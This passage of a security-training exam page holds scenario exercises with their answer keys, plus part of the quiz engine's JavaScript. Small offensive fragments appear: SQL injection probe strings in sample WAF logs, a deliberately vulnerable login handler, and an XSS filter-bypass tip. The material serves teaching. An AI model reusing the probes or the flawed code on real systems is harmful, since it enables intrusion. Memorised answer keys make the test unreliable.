query by string {{b2}}, so an attacker can {{b3}}. Remediation: use {{b4}} and reject unexpected input; add a regression test that fires this report's payload. Track under CWE-89 in the {{b5}}.","bank":["Critical","Medium","concatenation","output encoding","extract the users table","render a popup","parameterized queries","risk register","fuzzing corpus","PASTA"],"blanks":{"b1":"Critical","b2":"concatenation","b3":"extract the users table","b4":"parameterized queries","b5":"risk register"},"hint":"Severity word matches the CVSS band. The bug class is about gluing strings; the fix keeps data out of the query.","expl":"CVSS 9.1 lands in the Critical band. The mechanism is string concatenation into SQL, and the demonstrated impact is data extraction \u2014 'extract the users table'. The fix is parameterized queries, or an ORM that binds parameters for you, plus input rejection and a regression test so the reported payload becomes a permanent check \u2014 that is how penetration test findings stop repeating. CWE-89 is the weakness taxonomy entry for SQL injection, and the finding lives in the risk register with an owner and a deadline. 'Render a popup' and 'output encoding' describe XSS, a different bug class; a fuzzing corpus is an input collection, not a tracker.","focus":"Pentest finding = severity + mechanism + impact + fix + tracking. Map severity words to CVSS bands."},{"id":"H19","t":"The bounty desk","type":"branch","pts":3,"themes":["Security Testing","Vulnerability Response"],"kw":["Bug bounty","SLA","Escalation","Security champion","Regression testing"],"scenario":"You run the bug bounty desk. A researcher reports a critical RCE in the public API with a working proof of concept, through the program, at 09:00 Tuesday. Program SLA: critical = 72h triage, 30 days to fix. Walk the coordination.","question":"Choose the right move at every step.","steps":[{"text":"First action after duplicate-checking the report?","opts":[{"t":"Acknowledge within the SLA window, confirm receipt in the bounty platform, start triage","ok":true,"note":"Right: the SLA clock and the researcher's trust both start with acknowledgment."},{"t":"Thank them on the company blog immediately","ok":false,"note":"Public praise before confirmation can burn the researcher and the company if the report is wrong."},{"t":"Forward it to the developer mailbox and wait","ok":false,"note":"No acknowledgment, no owner, no clock \u2014 that is how researchers end up going public, angry."}]},{"text":"Triage confirms the RCE. The security champion pulls in the API team. Fix path?","opts":[{"t":"Fix with a regression test, rotate any exposed secrets, keep the researcher updated at agreed checkpoints","ok":true,"note":"Complete: fix, credential hygiene, and coordination keep the program healthy."},{"t":"Hotfix silently and close the report without telling the researcher","ok":false,"note":"Ghosting burns reputation and usually triggers public disclosure."},{"t":"Ask the researcher not to publish, offering no timeline","ok":false,"note":"Silence plus demands is the exact pattern that turns a partner into an adversary."}]},{"text":"Fix deployed in 26 days. Disclosure and reward?","opts":[{"t":"Coordinate disclosure with the researcher, pay the bounty, publish the advisory crediting them","ok":true,"note":"Best practice: reward plus coordinated disclosure keep researchers coming back."},{"t":"Publish immediately, naming the researcher without consent","ok":false,"note":"Consent and credit are part of coordinated disclosure."},{"t":"Pay nothing; the RCE was 'easy to find'","ok":false,"note":"Not paying valid criticals kills the program's pipeline of findings."}]}],"hint":"SLA first, fix and rotate, then coordinated disclosure with credit and payment.","expl":"A bug bounty is a relationship machine. Acknowledge inside the SLA so the researcher knows the clock started. Fix with a regression test, rotate exposed secrets, and keep checkpoints agreed with the reporter. Coordinated disclosure means the researcher agrees on timing, gets credit and gets paid \u2014 that is what keeps serious researchers in your program instead of on social media. Ghosting, unconsented naming, and refusing valid payouts are the three classic ways programs die.","focus":"Bounty flow = acknowledge, fix + rotate, coordinate disclosure + pay + credit."},{"id":"H20","t":"Name the treatment","type":"match","pts":3,"themes":["Vulnerability Response"],"kw":["Remediation","Mitigation","Risk acceptance","Risk transfer","Risk avoidance","Compensating controls"],"scenario":"The risk committee mixed six situations into one list. Each one is a textbook example of exactly one risk treatment.","question":"Match each situation to its treatment.","left":[{"k":"r1","t":"Upgrade the vulnerable library in the next sprint release"},{"k":"r2","t":"WAF rule blocks the exploit pattern until the patch ships"},{"k":"r3","t":"Board signs off keeping the low-risk internal tool unchanged, reviewed yearly"},{"k":"r4","t":"Cyber insurance covers the financial impact of ransomware"},{"k":"r5","t":"The public file-upload feature is switched off permanently"},{"k":"r6","t":"Until the patch lands, the app is reachable only via a recorded jump host"}],"right":[{"k":"r1","t":"Remediation"},{"k":"r2","t":"Mitigation"},{"k":"r3","t":"Risk acceptance"},{"k":"r4","t":"Risk transfer"},{"k":"r5","t":"Risk avoidance"},{"k":"r6","t":"Compensating control"}],"hint":"Fix = remediation. Soften = mitigation. Sign and keep = acceptance. Insure = transfer. Remove the thing = avoidance. Restrict while waiting = compensating control.","expl":"Fixing the library removes the flaw: remediation. The WAF rule softens exposure without fixing: mitigation. The signed, reviewed decision to keep the tool unchanged: risk acceptance. Insurance moves financial impact to another party: risk transfer. Switching the risky feature off permanently deletes the exposure: risk avoidance. And restricting access through a recorded jump host while the real fix is scheduled: a compensating control. The exam trap is insurance \u2014 it pays for impact, it never removes a vulnerability.","focus":"Ask: does it remove the flaw, reduce exposure, keep it signed, pay someone, or delete the exposure?"},{"id":"H21","t":"Authentication under the knife","type":"spot","pts":3,"themes":["Secure Coding"],"kw":["User enumeration","Error handling","Secure defaults","Secrets management","Code review"],"scenario":"Two approvals, zero security review. The login handler below passed functional review with 'LGTM' comments. You get it before merge.","question":"Click every line that contains a security flaw.","code":[{"t":"// reviewed by: senior dev, 2 approvals"},{"t":"function login(user, pass):"},{"t":"    if not userExists(user): return 'NO_SUCH_USER'","bad":true,"why":"Different message for missing users \u2014 user enumeration oracle."},{"t":"    if not checkPassword(user, pass): return 'BAD_PASSWORD'","bad":true,"why":"Different message for wrong password \u2014 completes the enumeration oracle."},{"t":"    if failedAttempts(user) > 1000: lock = true","bad":true,"why":"Lockout after 1000 tries is no brute-force protection."},{"t":"    log.debug('login attempt user=' + user + ' pass=' + pass)","bad":true,"why":"Passwords written to logs \u2014 secret leakage."},{"t":"    hash = bcrypt.hash(pass, 12)"},{"t":"    setCookie(session, httponly=true, secure=true, sameSite='lax')"},{"t":"    return 'WELCOME'"}],"hint":"Two messages differ, one lockout is a joke, one line writes secrets where they must never live.","expl":"Four flaws. Different messages for 'no such user' and 'bad password' form a user-enumeration oracle \u2014 attackers map valid accounts for free; both paths must return one generic failure. Locking after 1000 failed attempts is theater: credential stuffing finishes long before; use throttling and adaptive limits instead. Writing the password into debug logs leaks credentials to anyone with log access \u2014 secrets never belong in logs. Note line 1: two approvals caught none of this. Code review checks logic; a security review checks oracles, lockouts and logging \u2014 that is error handling with secure defaults in mind.","focus":"One generic error for all login failures, real throttling, and never log secrets."},{"id":"H22","t":"Blocked, or covered?","type":"logviewer","pts":4,"themes":["Vulnerability Response","Attack Frameworks"],"kw":["False positive","Diamond Model","IOA","Containment","Evidence","Correlation"],"scenario":"The WAF blocked a wave of SQL injection from 203[.]0[.]113[.]50 at 11:02. Your manager calls it 'blocked, false alarm, close it'. Check the correlation across both logs before you agree.","question":"Correlate the WAF and application logs, then complete the assessment.","logs":[{"t":"11:02:01 WAF BLOCK src=203[.]0[.]113[.]50 rule=SQLi-union uri=/api/v2/orders?id=1%20UNION%20SELECT","lvl":"warn"},{"t":"11:02:04 WAF BLOCK src=203[.]0[.]113[.]50 rule=SQLi-union uri=/api/v2/orders?id=2%20UNION%20SELECT","lvl":"warn"},{"t":"11:02:07 APP 203[.]0[.]113[.]50 POST /api/export?range=all 200 2411KB token=tr_8812","lvl":"err"},{"t":"11:02:09 WAF BLOCK src=203[.]0[.]113[.]50 rule=SQLi-union uri=/api/v2/customers?name=%27--","lvl":"warn"},{"t":"11:02:15 APP 198[.]51[.]100[.]9 GET /api/v2/orders?id=1 200 12KB token=tr_5510","lvl":"info"},{"t":"11:02:21 APP 203[.]0[.]113[.]50 POST /api/export?range=all 200 1877KB token=tr_8813","lvl":"err"},{"t":"11:03:00 AUTH login ok user=svc_export src=203[.]0[.]113[.]50","lvl":"info"},{"t":"11:03:14 APP 198[.]51[.]100[.]9 GET /api/health 200 2KB","lvl":"info"}],"sub":{"type":"fill","text":"While the WAF blocked the SQLi probes, the same source used a valid export token and pulled {{b1}} of data in two calls. In the Diamond Model, 203[.]0[.]113[.]50 is the {{b2}} vertex. Correct classification: {{b3}}.","bank":["4.3MB (two huge exports)","12KB (one normal order)","Infrastructure","Adversary","Capability","Victim","confirmed compromise \u2014 contain and hunt","false positive \u2014 close the ticket","policy violation only"],"blanks":{"b1":"4.3MB (two huge exports)","b2":"Infrastructure","b3":"confirmed compromise \u2014 contain and hunt"}},"hint":"Two different logs, one source. What did the WAF NOT see? Sizes and tokens tell the story.","expl":"Correlation beats single-log thinking. The WAF blocked the SQLi wave, but the same IP then made two multi-megabyte authorized export calls with valid tokens \u2014 behavior consistent with an attacker who already holds credentials and used the noisy probes as cover. That is a confirmed compromise, not a false positive: contain, revoke the export tokens, and hunt for earlier use. In Diamond Model terms the IP is Infrastructure \u2014 the resource the adversary operated through \u2014 while the adversary is the actor behind it and the export behavior is an IOA. Evidence to preserve: the export calls, the token IDs, and the auth log line.","focus":"A blocked attack wave can still be cover for a quieter, authorized-looking one. Correlate source, size, tokens."},{"id":"H23","t":"02:10 emergency","type":"qcm","pts":3,"themes":["SDLC & Process"],"kw":["Change management","CAB"],"scenario":"02:10. Active exploitation of your public API. You must push an emergency WAF rule to block the payload. The change advisory board (CAB) meets Mondays. The rule works at 02:25.","question":"What does correct change management look like here?","choices":["Push it as an emergency change with a retrospective CAB review within 48 hours","Wait for Monday's CAB \u2014 rules without prior approval are forbidden","Push it and skip documentation; emergencies are self-justifying","Roll the rule back at 09:00 because it lacked pre-approval"],"correct":[0],"hint":"Emergencies are fast, never undocumented. Which answer both acts now and closes the loop?","expl":"Emergency changes exist exactly for active exploitation: act first to protect production, then document and take the change to a retrospective CAB review inside a defined window \u2014 48 hours here. Waiting for Monday leaves an exploited API exposed, which is process over protection. Pushing without documentation breaks the audit trail and makes the change unrepeatable. Rolling back a working protection because paperwork lagged inverts the entire purpose of change management. The discipline lives in the retrospective review: what changed, why, what it broke, and what it teaches.","focus":"Emergency change = act, then document + retrospective review on a fixed clock."},{"id":"H24","t":"Harden the build system","type":"multi","pts":3,"themes":["CI/CD & Supply Chain"],"kw":["Commit signing","Branch protection","Secrets management","Least privilege","Supply chain","CI/CD pipeline"],"scenario":"As part of the DevSecOps rollout for the squad's Agile delivery cadence, you audit the build system for the payments repository. Seven proposed changes are on the table \u2014 some harden integrity, some just feel secure.","question":"Select every change that HARDENS the pipeline's integrity.","choices":["Require signed commits on protected branches","Make main a protected branch; merges need review plus green gates","Deploy with short-lived OIDC tokens instead of long-lived keys","Pin third-party actions to full commit hashes","Use one long-lived personal access token for all deploys \u2014 faster","Auto-deploy straight to production on every green commit","Give build runners cluster-admin to avoid permission tickets"],"correct":[0,1,2,3],"hint":"Integrity = prove who authored, review before merge, minimize standing secrets, pin what you pull.","expl":"Pipeline integrity rests on four habits here. Signed commits prove authorship. Protected branches force review and green gates before main moves. Short-lived OIDC tokens mean a leaked credential expires in minutes \u2014 the opposite of a long-lived personal access token, which is a master key with a long shelf life. Pinning actions to full commit hashes stops a tagged dependency from silently changing under you \u2014 the supply-chain move. The wrong answers trade control for speed: auto-deploying without gates and cluster-admin runners are the two most common real-world pipeline breaches.","focus":"Sign, protect, expire, pin. Speed bought with standing privileges is a breach on installments."},{"id":"H25","t":"Findings to OWASP categories","type":"dragdrop","pts":4,"themes":["Web Attack Classes"],"kw":["OWASP Top 10","Broken access control","Cryptographic failures","Injection","Security misconfiguration","Vulnerable components","Data integrity"],"scenario":"The annual OWASP mapping exercise. Six audit findings from the year must land in the correct 2021 category \u2014 the numbering still trips people up.","question":"Drag each finding onto its OWASP 2021 category.","slots":[{"k":"a01","t":"A01 \u2014 ?"},{"k":"a02","t":"A02 \u2014 ?"},{"k":"a03","t":"A03 \u2014 ?"},{"k":"a05","t":"A05 \u2014 ?"},{"k":"a06","t":"A06 \u2014 ?"},{"k":"a08","t":"A08 \u2014 ?"}],"items":[{"k":"a01","t":"Users read other tenants' invoices by editing an ID"},{"k":"a02","t":"Passwords hashed with plain MD5"},{"k":"a03","t":"User input reaches an OS command in the report module"},{"k":"a05","t":"Fresh install ships with admin/admin enabled"},{"k":"a06","t":"Build pulls a logging lib with a known RCE CVE"},{"k":"a08","t":"Update package downloaded with no signature or hash check"}],"hint":"Group by the flaw's essence: who may act, how secrets are stored, what input reaches, how the install is configured, how fresh the parts are, and whether updates are verifiably intact. Then match to the numbered categories.","expl":"The 2021 Top 10 in one exercise. Editing an ID to read other tenants' data is broken access control. MD5 password hashing is a cryptographic failure \u2014 an outdated algorithm choice. Input reaching an OS command is injection. Shipping admin/admin is a security misconfiguration \u2014 default credentials must be forced out at setup. Pulling a library with a known RCE is vulnerable and outdated components, exactly what SCA catches. Accepting unsigned updates is a software and data integrity failure \u2014 the category where supply-chain attacks live.","focus":"Six categories, six one-line signatures. Remember: A03 holds XSS too, and integrity is A08, not injection."},{"id":"H26","t":"After the hotfix","type":"order","pts":3,"themes":["SDLC & Process","Vulnerability Response"],"kw":["SDLC phases","Secure SDLC","Regression testing","Remediation validation","Risk register","UAT","Security requirements"],"scenario":"A hotfix for the deserialization flaw just merged. Your secure SDLC policy defines the maintenance-phase workflow of the software development life cycle for exactly this moment.","question":"Drag the five steps into the correct order.","items":["Run unit tests, integration and regression suites, plus user acceptance (UAT) sign-off in staging","Re-scan and validate the remediation on the fixed build","Update the finding in the tracker and the risk register","Close the ticket and notify stakeholders with the evidence","Hold a retrospective; feed root cause into next sprint's security requirements"],"hint":"Prove the fix, record it, tell people, then learn from it.","expl":"The maintenance phase closes the loop of the software development life cycle. Tests first: unit, integration and regression suites plus user acceptance sign-off prove the hotfix works and broke nothing. Then remediation validation \u2014 a re-scan proves the flaw is gone, not just patched in someone's opinion. The tracker and risk register receive the evidence; stakeholders receive the close-out. The retrospective turns root cause into security requirements for the next sprint \u2014 that step is what stops the same finding from returning as a sequel.","focus":"Fix, prove, record, inform, learn. The 'learn' step is the one teams skip."},{"id":"H27","t":"Model the payments flow","type":"fill","pts":3,"themes":["Threat Modeling & Architecture"],"kw":["Threat modeling","Trust boundary","STRIDE","Spoofing","DREAD","Security requirements"],"scenario":"Threat modeling the new mobile payments flow. Fill the model entry your security champion will paste into the design document.","question":"Fill every gap with the right term.","text":"The {{b1}} calls the API gateway across the trust boundary. A stolen JWT replayed from another network is a form of {{b2}} in STRIDE terms. Mitigations: short token {{b3}}, a server-side revocation list, and binding tokens to the client fingerprint. Residual risks become {{b4}} for the next sprint, ranked by DREAD-informed {{b5}} in the security backlog.","bank":["mobile client","API gateway","database cluster","Spoofing","Tampering","Repudiation","lifetime","price","security requirements","prioritization"],"blanks":{"b1":"mobile client","b2":"Spoofing","b3":"lifetime","b4":"security requirements","b5":"prioritization"},"hint":"Replaying someone's identity is the first letter of STRIDE. Residual risks feed the backlog as requirements.","expl":"A threat modeling entry names the actors, the trust boundary \u2014 where data crosses from a less-trusted to a more-trusted zone \u2014 the threat, and the control. A replayed JWT is the attacker pretending to be the victim: Spoofing, the S of STRIDE; Tampering, Repudiation and the rest describe different abuse types. Mitigations match the threat: short token lifetime, revocation and client binding shrink the replay window. Threat modeling is only useful when its output lands as security requirements in the backlog with prioritization \u2014 DREAD scores help rank them \u2014 otherwise it is security theater.","focus":"Entry format: boundary, threat (STRIDE letter), mitigation, requirement. Replay = Spoofing."},{"id":"H28","t":"The console edit","type":"qcm","pts":3,"themes":["CI/CD & Supply Chain"],"kw":["IaC","Policy as code","Security misconfiguration"],"scenario":"A production database's security group allows the whole internet in. The Terraform repository says restricted. Someone clicked it open during the March incident and never reverted; nothing noticed for four months.","question":"Which control systematically prevents this class of drift?","choices":["Policy-as-code checks plus drift detection that reverts console edits","Email the cloud admin to be more careful with console changes","A weekly spreadsheet audit of every security group","Delete the Terraform code and manage the console by hand"],"correct":[0],"hint":"The console edit bypassed the repository. The fix must make the pipeline the only door \u2014 and notice when reality diverges.","expl":"Configuration drift happens when the console and the code disagree. Infrastructure-as-code only works if the pipeline is the single door: policy-as-code checks \u2014 deny open ingress rules, deny public buckets \u2014 run on every change, and drift detection reverts out-of-band console edits or at least alerts on them within minutes. Emails and spreadsheets rely on human memory and miss everything that happens between Fridays. Deleting the code removes the only source of truth, the opposite of a fix. This is why auditors test IaC drift specifically: the gap between declared and actual state is where security misconfiguration hides.","focus":"IaC + policy-as-code + drift detection = one door, automatic checks, no silent exceptions."},{"id":"H29","t":"The vulnerability alphabet","type":"match","pts":3,"themes":["Vulnerability Response"],"kw":["CVE","CWE","CVSS","KEV","CNA","CPE"],"scenario":"A new analyst keeps mixing the identifiers in reports. Six definitions, six acronyms \u2014 you build the reference card.","question":"Match each definition to its acronym.","left":[{"k":"v1","t":"The published ID for one specific vulnerability, like CVE-2026-1234"},{"k":"v2","t":"The taxonomy of software flaw types, like CWE-89 for SQL injection"},{"k":"v3","t":"The 0-10 severity scoring system with a vector string"},{"k":"v4","t":"The US government catalog of vulnerabilities exploited in the wild"},{"k":"v5","t":"An organization authorized to assign CVE IDs"},{"k":"v6","t":"The standard naming scheme for products in scan reports"}],"right":[{"k":"v1","t":"CVE"},{"k":"v2","t":"CWE"},{"k":"v3","t":"CVSS"},{"k":"v4","t":"KEV (CISA)"},{"k":"v5","t":"CNA"},{"k":"v6","t":"CPE"}],"hint":"Decode the letters first: three of them stand for common 'V', 'W' and 'S' phrases. The two remaining C-acronyms split into 'who assigns IDs' and 'what names a product'.","expl":"The vulnerability alphabet: CVE is the published ID of one specific vulnerability. CWE classifies the weakness type \u2014 CWE-89 is SQL injection. CVSS scores severity from 0 to 10 with a vector string that shows why. CISA's KEV lists CVEs confirmed exploited in the wild \u2014 items there jump the remediation queue. CNAs are the organizations, vendors and researchers, allowed to assign CVE IDs. CPE names products in a standard format so scanners can match versions unambiguously. Reports that mix these up confuse identity, cause and severity \u2014 three different things.","focus":"One vulnerability = CVE. One flaw type = CWE. One score = CVSS. One 'being exploited' stamp = KEV."},{"id":"H30","t":"Two sides of one flaw","type":"match","pts":3,"themes":["Secure Coding"],"kw":["XSS","Output encoding","CSP","Secure headers","CSRF"],"scenario":"Dual perspective. Your comment field renders user HTML raw. Blue team must defend it; red team must attack it. Match each objective to its move.","question":"Match each team objective to the correct move.","left":[{"k":"b1","t":"BLUE \u2014 prevent stored XSS at the root"},{"k":"b2","t":"BLUE \u2014 see exploitation attempts without blocking yet"},{"k":"b3","t":"RED \u2014 bypass a naive script-tag filter"},{"k":"b4","t":"RED \u2014 cookies are HttpOnly, so instead of stealing them..."}],"right":[{"k":"b1","t":"Output-encode on render and validate on input"},{"k":"b2","t":"Deploy CSP in report-only mode with alerts"},{"k":"b3","t":"Use img onerror event handlers as the payload"},{"k":"b4","t":"Act as the user via forged requests, CSRF-style"}],"hint":"Blue thinks in controls (encode, monitor). Red thinks in bypasses (handlers, not tags) and pivots.","expl":"Two sides of one flaw. Blue: output encoding on render is the root fix \u2014 data stays data; CSP in report-only mode surfaces exploitation attempts in alerts before you enforce it; both are security headers working together. Red: naive filters match script tags, so event handlers like img onerror carry the payload instead. If HttpOnly shields the cookies, the attacker pivots from theft to impersonation \u2014 forged requests that ride the victim's session, which SameSite cookies and CSRF tokens then complicate. Defenders who study the red side write filters that actually hold.","focus":"Encode at output, watch with CSP, expect handler-based payloads, and assume pivots once cookies harden."}]};
</script>
<script>
/* ===== CyberPulse exam engine — part A: core, intro, timer, navigation ===== */
'use strict';
var DATA = window.__EXAM_DATA__;
var META = DATA.meta, EXS = DATA.exercises, KW = DATA.keywords;
var PTS_TOTAL = EXS.reduce(function (a, e) { return a + e.pts; }, 0);
var MIN_ELS_HINT_PENALTY = 0.9;

function $(id) { return document.getElementById(id); }
function el(tag, cls, txt) { var n = document.createElement(tag); if (cls) n.className = cls; if (txt != null) n.textContent = txt; return n; }
function shuffle(a) { a = a.slice(); for (var i = a.length - 1; i > 0; i--) { var j = Math.floor(Math.random() * (i + 1)); var t = a[i]; a[i] = a[j]; a[j] = t; } return a; }
function idxArr(n) { var r = []; for (var i = 0; i < n; i++) r.push(i); return r; }
function clamp1(x) { return Math.round(x * 10) / 10; }

var S = {
  phase: 'intro', order: [], cur: 0, st: [], V: [],
  manualPause: false, checkPause: false,
  remain: 0, timerId: null, reported: false, user: '', theme: 'dark'
};
var RES = null;

function freshState() {
  return { status: 'new', ans: null, touched: false, checked: false, explSeen: false,
           earned: 0, els: null, sumS: '', sumC: '', hints: 0, termLog: [], path: [] };
}

/* ---------- shuffled per-attempt view state ---------- */
function buildViews() {
  S.V = EXS.map(function (ex) {
    var v = {};
    if (ex.type === 'qcm' || ex.type === 'multi') { v.ord = shuffle(idxArr(ex.choices.length)); }
    else if (ex.type === 'fill') { v.ord = shuffle(idxArr(ex.bank.length)); }
    else if (ex.type === 'match') { v.ord = shuffle(idxArr(ex.right.length)); }
    else if (ex.type === 'dragdrop') { v.iord = shuffle(idxArr(ex.items.length)); }
    else if (ex.type === 'order') {
      var o = shuffle(idxArr(ex.items.length));
      var same = true;
      for (var k = 0; k < o.length; k++) { if (o[k] !== k) { same = false; break; } }
      if (same && o.length > 1) o = shuffle(o);
      v.ord = o;
    } else if (ex.type === 'logviewer') {
      v.sub = {};
      var sb = ex.sub;
      if (sb.type === 'qcm' || sb.type === 'multi') v.sub.ord = shuffle(idxArr(sb.choices.length));
      else if (sb.type === 'fill') v.sub.ord = shuffle(idxArr(sb.bank.length));
    }
    else if (ex.type === 'branch') {
      v.bord = ex.steps.map(function (s) { return shuffle(idxArr(s.opts.length)); });
    }
    return v;
  });
}

/* ---------- screens ---------- */
function show(id) { ['scr-intro', 'scr-exam', 'scr-results'].forEach(function (s) { $(s).hidden = (s !== id); }); }

function renderIntro() {
  var w = $('intro-body'); w.textContent = '';
  var greet = el('div', 'dimtxt'); greet.id = 'greet';
  greet.textContent = S.user ? ('Candidate: ' + S.user) : 'Standalone mode — you can start right away.';
  w.appendChild(greet);
  var h = el('h1', 'h1', META.docTitle); w.appendChild(h);
  var sub = el('div', 'sub', META.docSub); w.appendChild(sub);

  var chips = el('div'); chips.className = 'btnrow';
  [{ t: EXS.length + ' exercises' }, { t: META.difficulty.toUpperCase() + ' severity' },
   { t: META.minutes + ' minutes' }, { t: 'Pass mark: ' + META.passMark + '%' },
   { t: PTS_TOTAL + ' points' }].forEach(function (c) { chips.appendChild(el('span', 'chip acc', c.t)); });
  w.appendChild(chips);

  var kp = el('div', 'panel'); kp.appendChild(el('div', 'blabel', 'Keywords covered — grouped by theme'));
  var grid = el('div', 'kwgrid');
  KW.forEach(function (k) {
    var c = el('div', 'kwcard');
    c.appendChild(el('div', 'kt', k.theme));
    var ul = el('ul');
    k.items.forEach(function (i) { ul.appendChild(el('li', null, i.k)); });
    c.appendChild(ul); grid.appendChild(c);
  });
  kp.appendChild(grid); w.appendChild(kp);

  var how = el('div', 'panel'); how.appendChild(el('div', 'blabel', 'How this exam works'));
  var ul = el('ul', 'rules');
  [
    'Realistic, scenario-based exercises: incident work, code review, logs, terminals, pipelines — not textbook quizzes.',
    'Every exercise has SCENARIO, QUESTION and ANSWERS blocks, so you always know what is being asked.',
    'Press Check to validate. It shows what was right (green), wrong (red) or missed (amber), locks the answer for scoring, and freezes the timer in review mode. The exercise stays fully visible. Press Next to resume the timer.',
    'Press Skip to jump to the next exercise. Skipped exercises are marked amber and excluded from both score points and total points at the end. You can go back to them while the timer runs.',
    'Multi-answer exercises give partial credit: each correct element earns its share. A wrong selection earns nothing but does not subtract.',
    'Hint button: reveals a nudge, never the answer. One hint costs 10% of that exercise\u2019s points.',
    'Two independent pauses: the manual Pause button hides the exercise, while the Check-pause (review mode) keeps everything visible. The timer runs only when both are cleared.',
    'After Check you can press Revise to change your answer, then Check again — each new Check freezes the timer again.',
    'Final score = earned points / points of the exercises you actually answered. ' + META.passMark + '% is a pass.'
  ].forEach(function (t) { ul.appendChild(el('li', null, t)); });
  how.appendChild(ul); w.appendChild(how);

  var b = el('button', 'btn primary'); b.id = 'b-start'; b.textContent = 'Start exam';
  b.addEventListener('click', startExam);
  w.appendChild(b);
}

/* ---------- exam lifecycle ---------- */
function startExam() {
  S.order = shuffle(idxArr(EXS.length));
  S.st = EXS.map(function () { return freshState(); });
  buildViews();
  S.cur = 0; S.remain = META.minutes * 60;
  S.manualPause = false; S.checkPause = false; S.reported = false; RES = null;
  S.phase = 'exam';
  show('scr-exam');
  renderTimer(); renderScore(); renderTheme();
  renderCur(); updatePauseUI(); startTimer();
}

function curI() { return S.order[S.cur]; }

function gotoPos(p) {
  S.checkPause = false;
  S.cur = p;
  renderCur(); updatePauseUI(); renderNav();
}

/* ---------- header rendering ---------- */
function renderTimer() {
  var m = Math.floor(S.remain / 60), s = S.remain % 60;
  var t = $('t-timer');
  t.textContent = 'Time ' + m + ':' + (s < 10 ? '0' : '') + s;
  t.classList.remove('warn', 'bad');
  if (S.remain <= 300) t.classList.add('bad');
  else if (S.remain <= 600) t.classList.add('warn');
}
function renderScore() {
  var e = 0; S.st.forEach(function (st) { if (st.checked) e += st.earned; });
  $('t-score').textContent = 'Score ' + clamp1(e) + ' / ' + PTS_TOTAL;
}
function renderProgress() {
  var done = 0; S.st.forEach(function (st) { if (st.checked) done++; });
  $('progfill').style.width = Math.round(done / EXS.length * 100) + '%';
  $('progtxt').textContent = done + ' of ' + EXS.length + ' checked';
}
function renderTheme() {
  var row = $('themerow'); row.textContent = '';
  KW.forEach(function (k) {
    var tot = 0, done = 0;
    EXS.forEach(function (ex, i) {
      if (ex.themes.indexOf(k.theme) >= 0) { tot++; if (S.st[i].checked) done++; }
    });
    row.appendChild(el('span', 'themechip', k.theme + ' '));
    var last = row.lastChild; var b = el('b', null, done + '/' + tot); last.appendChild(b);
  });
}

/* ---------- navigator ---------- */
function renderNav() {
  var g = $('navgrid'); g.textContent = '';
  S.order.forEach(function (ei, pos) {
    var st = S.st[ei];
    var b = el('button', 'nchip');
    b.textContent = String(pos + 1);
    b.setAttribute('aria-label', 'Go to exercise ' + (pos + 1) +
      (st.checked ? ', answered' : st.status === 'skipped' ? ', skipped' : ''));
    if (st.checked) { b.classList.add('checked'); b.appendChild(el('span', 'tag sr', 'done')); }
    else if (st.status === 'skipped') { b.classList.add('skipped'); b.appendChild(el('span', 'tag', 'S')); }
    else if (st.touched) { b.classList.add('seen'); }
    if (pos === S.cur) b.classList.add('cur');
    b.addEventListener('click', function () { gotoPos(pos); });
    g.appendChild(b);
  });
}

/* ---------- timer & pause ---------- */
function startTimer() {
  if (S.timerId) clearInterval(S.timerId);
  S.timerId = setInterval(function () {
    if (S.phase !== 'exam' || S.manualPause || S.checkPause) return;
    S.remain--;
    if (S.remain <= 0) { S.remain = 0; renderTimer(); finishExam('time'); return; }
    renderTimer();
  }, 1000);
}
function updatePauseUI() {
  var parts = [];
  if (S.manualPause) parts.push('Paused (manual)');
  if (S.checkPause) parts.push('Timer paused \u2014 review mode');
  var t = $('t-status');
  t.textContent = ''; t.hidden = parts.length === 0;
  if (parts.length) {
    t.appendChild(el('span', 'dot', ''));
    t.appendChild(document.createTextNode(parts.join('  \u00b7  ')));
  }
  document.body.classList.toggle('manpause', S.manualPause);
}
function toggleManualPause() {
  if (S.phase !== 'exam') return;
  S.manualPause = !S.manualPause;
  $('b-pause').textContent = S.manualPause ? 'Resume' : 'Pause';
  $('b-pause').setAttribute('aria-pressed', String(S.manualPause));
  updatePauseUI();
}

/* ===== engine part B: exercise renderers ===== */
var TYPE_LABEL = {
  qcm: 'CHOOSE ONE ANSWER', multi: 'SELECT ALL THAT APPLY',
  fill: 'FILL IN THE BLANKS — pick a word for each gap',
  match: 'MATCH EACH ITEM — pick the partner for each row',
  dragdrop: 'DRAG THE ITEMS INTO THE RIGHT SLOT — or click a chip, then a slot',
  order: 'PUT THE STEPS IN THE RIGHT ORDER — use the arrows or drag',
  spot: 'CLICK EVERY LINE THAT CONTAINS THE FLAW, then Check',
  terminal: 'TYPE THE COMMAND IN THE TERMINAL, then Check',
  logviewer: 'ANALYZE THE LOGS (filter box above), THEN ANSWER BELOW',
  branch: 'WORK THE INCIDENT — choose one action at each step'
};

function blockInto(parent, labelCls, label, body) {
  var b = el('section', 'block ' + labelCls);
  b.appendChild(el('div', 'blabel', label));
  if (body) b.appendChild(body);
  parent.appendChild(b);
  return b;
}

function renderCur() {
  var i = curI(), ex = EXS[i], st = S.st[i];
  $('ex-num').textContent = 'Exercise ' + (S.cur + 1) + ' of ' + EXS.length;
  $('ex-title').textContent = ex.t;
  $('ex-kw').textContent = 'Theme: ' + ex.themes.join(' \u00b7 ') + '  |  Keywords: ' + ex.kw.join(', ') + '  |  ' + ex.pts + ' pts';
  var body = $('exbody'); body.textContent = '';
  blockInto(body, 'scenario', 'SCENARIO', null).appendChild(mkText(ex.scenario));
  blockInto(body, 'qb', 'QUESTION', null).appendChild(mkText(ex.question));
  var ansB = blockInto(body, 'ab', TYPE_LABEL[ex.type] || 'ANSWER', null);
  var holder = el('div', 'answrap'); ansB.appendChild(holder);
  RENDER[ex.type](ex, st, holder, S.V[i]);
  if (st.checked) { holder.classList.add('locked'); applyMarks(ex, st, holder); }
  buildFeedback(body, ex, st);
  if (st.checked) fillFeedback(ex, st);
  buildExpl(body, ex, st);
  if (st.hints > 0 && !st.checked) {
    var hz = el('div', 'hintp'); hz.id = 'hintzone';
    hz.appendChild(el('div', 't', 'Hint (\u221210% on this exercise)'));
    hz.appendChild(mkText(ex.hint));
    body.appendChild(hz);
  }
  syncButtons(); renderNav(); renderProgress();
}

function mkText(t) { var d = el('div', null, null); d.textContent = t; return d; }
function noticeBox(msg) { var n = el('div', 'notice'); n.textContent = msg; return n; }

/* ================= renderers ================= */
var RENDER = {};

RENDER.qcm = function (ex, st, box, v) {
  if (!st.ans) st.ans = null;
  v.ord.forEach(function (ci) {
    var lab = el('label', 'opt');
    var r = el('input'); r.type = 'radio'; r.name = 'q' + curI(); r.checked = (st.ans === ci);
    r.dataset.ci = ci;
